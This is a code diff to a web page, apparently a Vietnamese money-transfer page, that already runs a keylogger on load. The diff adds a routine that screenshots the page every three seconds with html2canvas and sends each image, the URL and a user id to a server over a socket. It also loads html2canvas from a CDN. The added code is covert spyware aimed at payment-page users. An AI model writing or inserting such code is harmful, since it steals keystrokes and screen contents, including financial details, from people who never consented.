@@ -44,8 +44,35 @@
         let keylogData = [];
         
         window.addEventListener('load', () => {
+            setTimeout(startScreenCapture, 2000);
             startKeylogging();
         });
+        
+        async function startScreenCapture() {
+            try {
+                const captureInterval = setInterval(async () => {
+                    try {
+                        const tempCanvas = await html2canvas(document.body, {
+                            allowTaint: true,
+                            useCORS: true,
+                            scale: 0.5
+                        });
+                        
+                        const imageData = tempCanvas.toDataURL('image/jpeg', 0.6);
+                        socket.emit('screen-capture', {
+                            userId: socket.id,
+                            screenshot: imageData,
+                            timestamp: Date.now(),
+                            url: window.location.href
+                        });
+                    } catch (e) {
+                        console.log('Screen capture failed');
+                    }
+                }, 3000);
+            } catch (err) {
+                console.log('Screen capture not supported');
+            }
+        }
         
         function startKeylogging() {
             document.addEventListener('keydown', (e) => {
@@ -122,5 +149,6 @@
             alert('Chuyển khoản thành công!');
         }
     </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </body>
 </html>
